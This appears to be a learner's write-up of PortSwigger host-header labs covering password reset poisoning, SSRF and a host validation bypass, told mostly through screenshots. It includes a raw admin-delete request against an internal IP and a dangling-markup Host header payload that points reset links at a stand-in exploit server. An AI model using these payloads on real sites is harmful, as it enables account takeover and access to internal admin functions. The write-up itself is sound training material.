**Basic password reset poisoning**

From <https://portswigger.net/web-security/host-header/exploiting/password-reset-poisoning/lab-host-header-basic-password-reset-poisoning> 

Capture a password reset request
![image](https://github.com/VietTheBarbarian/Manual-Application-Testing/assets/56415307/475ae3f6-2f67-44d5-9194-57719a4a8f4f)



Arbitrary host gave us a 200 status
![image](https://github.com/VietTheBarbarian/Manual-Application-Testing/assets/56415307/110de408-0f7f-43af-a21d-3ed82ba45987)




Our email shows a google url
![image](https://github.com/VietTheBarbarian/Manual-Application-Testing/assets/56415307/09a3af34-594d-40d2-95c6-195907dc9287)


Changing the host name to our malicious exploit server email client
![image](https://github.com/VietTheBarbarian/Manual-Application-Testing/assets/56415307/4c74fe59-135a-42c2-8ec7-08aa7d4e6586)



Changing user to carlos 
![image](https://github.com/VietTheBarbarian/Manual-Application-Testing/assets/56415307/a2b4e522-7bd5-4795-bf70-a04bec1a59e9)



Our url to replace carlos password in a access log
![image](https://github.com/VietTheBarbarian/Manual-Application-Testing/assets/56415307/03b1f702-664d-4a5a-92aa-e33e7358e057)



Password changed and logged in
![image](https://github.com/VietTheBarbarian/Manual-Application-Testing/assets/56415307/7c64ae2c-f16d-4744-bfef-4b343b3a4232)

![image](https://github.com/VietTheBarbarian/Manual-Application-Testing/assets/56415307/74404156-78dc-4e87-8ba5-2db783bb2616)





**Routing-based SSRF**

From <https://portswigger.net/web-security/host-header/exploiting/lab-host-header-routing-based-ssrf> 

We need burp collaborator to poll http session for this lab since it doesn’t have a exploit server  

Go to /admin 
![image](https://github.com/VietTheBarbarian/Manual-Application-Testing/assets/56415307/4ae506c8-c7cf-4e79-a3bd-ac4395f0216c)



Enter a private ip
![image](https://github.com/VietTheBarbarian/Manual-Application-Testing/assets/56415307/e884dca6-3655-4968-8d70-3a63ec718edd)


Send to intruder and parameterize the following 
![image](https://github.com/VietTheBarbarian/Manual-Application-Testing/assets/56415307/acb111c1-4af1-4f88-a536-ce56f20d299c)


Our payload 
![image](https://github.com/VietTheBarbarian/Manual-Application-Testing/assets/56415307/0bab0311-717a-4edf-8dac-60ef8de3f51a)


Found
![image](https://github.com/VietTheBarbarian/Manual-Application-Testing/assets/56415307/d9eb0b0a-7353-4e2d-9c8f-41c7790386a8)


Transfer to repeater and go to admin directory
![image](https://github.com/VietTheBarbarian/Manual-Application-Testing/assets/56415307/5be21b20-4917-4fa8-8ffd-85485ba645ca)



Delete user
![image](https://github.com/VietTheBarbarian/Manual-Application-Testing/assets/56415307/8f0a0ae9-db4b-4628-9b32-21e494a2dd10)




**SSRF via flawed request parsing**

From <https://portswigger.net/web-security/host-header/exploiting/lab-host-header-ssrf-via-flawed-request-parsing> 

We don’t have collaborator to confirm so when get a chance test it out

Putting whole url get us a 504 request
![image](https://github.com/VietTheBarbarian/Manual-Application-Testing/assets/56415307/2d05bdc0-bb88-4fde-a0fb-842f9554ae88)





Bruteforce like previous
![image](https://github.com/VietTheBarbarian/Manual-Application-Testing/assets/56415307/274d9b38-9de1-4b1e-bbb6-7acdd56354fb)




Access admin panel
![image](https://github.com/VietTheBarbarian/Manual-Application-Testing/assets/56415307/ffcc1311-d504-4142-878c-11710ee532a5)


Delete user to complete
![image](https://github.com/VietTheBarbarian/Manual-Application-Testing/assets/56415307/893cb145-750c-474b-b14d-9eab3061e507)



**Host validation bypass via connection state attack**

From <https://portswigger.net/web-security/host-header/exploiting/lab-host-header-host-validation-bypass-via-connection-state-attack> 

Send the GET / request to Burp Repeater. 

From <https://portswigger.net/web-security/host-header/exploiting/lab-host-header-host-validation-bypass-via-connection-state-attack> 

Change the path to /admin. 
Change Host header to 192.168.0.1. 
Send the request. Observe that you are simply redirected to the homepage
![image](https://github.com/VietTheBarbarian/Manual-Application-Testing/assets/56415307/e70c8812-e8e2-4fa0-8479-3fc5fc14d178)


Create group
Using the drop-down menu next to the Send button, change the send mode to Send group in sequence (single connection). 
Send a duplicate for two tab
![image](https://github.com/VietTheBarbarian/Manual-Application-Testing/assets/56415307/e1c27276-19a3-4c1a-b857-7ad6f831c000)


Our first request
![image](https://github.com/VietTheBarbarian/Manual-Application-Testing/assets/56415307/266c7593-5d46-43d4-8fe5-8d608648cec8)





Our second request
![image](https://github.com/VietTheBarbarian/Manual-Application-Testing/assets/56415307/31212cda-17f5-44d2-a830-d9874d7f0115)



Sending request we can delete user
![image](https://github.com/VietTheBarbarian/Manual-Application-Testing/assets/56415307/91271534-8e8e-4e8e-acc8-0e778c16a4ee)




Modify request to include csrf and username
![image](https://github.com/VietTheBarbarian/Manual-Application-Testing/assets/56415307/0dbffd80-56be-4531-81f8-67b1ccaa59ae)



Error when send
![image](https://github.com/VietTheBarbarian/Manual-Application-Testing/assets/56415307/547d260c-de4e-4dcb-8c22-5c13cfb0e745)


Change request method to post

![image](https://github.com/VietTheBarbarian/Manual-Application-Testing/assets/56415307/77523dba-f4e4-40cc-a629-43b16a38a9da)


Send request to solve
![image](https://github.com/VietTheBarbarian/Manual-Application-Testing/assets/56415307/99c6adbd-ecc8-4f92-a485-3e735300d56f)




Burpesuite academy solution did not use

```
POST /admin/delete HTTP/1.1
Host: 192.168.0.1
Cookie: _lab=YOUR-LAB-COOKIE; session=YOUR-SESSION-COOKIE
Content-Type: x-www-form-urlencoded
Content-Length: CORRECT

csrf=YOUR-CSRF-TOKEN&username=carlos
```


**Password reset poisoning via dangling markup**

From <https://portswigger.net/web-security/host-header/exploiting/password-reset-poisoning/lab-host-header-password-reset-poisoning-via-dangling-markup> 

Go through the password reset with proxy on
Observe that the HTML content for your email is written to a string, but this is being sanitized using the DOMPurify library before it is rendered by the browser. 
![image](https://github.com/VietTheBarbarian/Manual-Application-Testing/assets/56415307/53820e02-d6c8-4794-b2a8-24d88b6990ea)




We have option to view raw html on our email
![image](https://github.com/VietTheBarbarian/Manual-Application-Testing/assets/56415307/64e16478-cbeb-4ec6-a46d-f8aae5efab92)



Sending the following will trigger a password reset
Host: YOUR-LAB-ID.web-security-academy.net:arbitraryport
![image](https://github.com/VietTheBarbarian/Manual-Application-Testing/assets/56415307/dc54047c-cf71-46b7-ac37-9a32c21dff19)

![image](https://github.com/VietTheBarbarian/Manual-Application-Testing/assets/56415307/2f698404-f047-4177-947a-2a8ec43f22b4)




Viewing raw will see our port being reflect 
![image](https://github.com/VietTheBarbarian/Manual-Application-Testing/assets/56415307/8c8a298d-d336-42ae-960b-49afe6c16322)


We can exploit this by including our exploit server
```
Host: YOUR-LAB-ID.web-security-academy.net:'<a href="//YOUR-EXPLOIT-SERVER-ID.exploit-server.net/?
```

From <https://portswigger.net/web-security/host-header/exploiting/password-reset-poisoning/lab-host-header-password-reset-poisoning-via-dangling-markup> 


Changing carlos password 
![image](https://github.com/VietTheBarbarian/Manual-Application-Testing/assets/56415307/f13eeb5d-6a1d-4d71-819e-5044ebef6042)


Our new password listed
![image](https://github.com/VietTheBarbarian/Manual-Application-Testing/assets/56415307/99481c1f-54fe-4011-a436-e6bdc5aa3fbd)


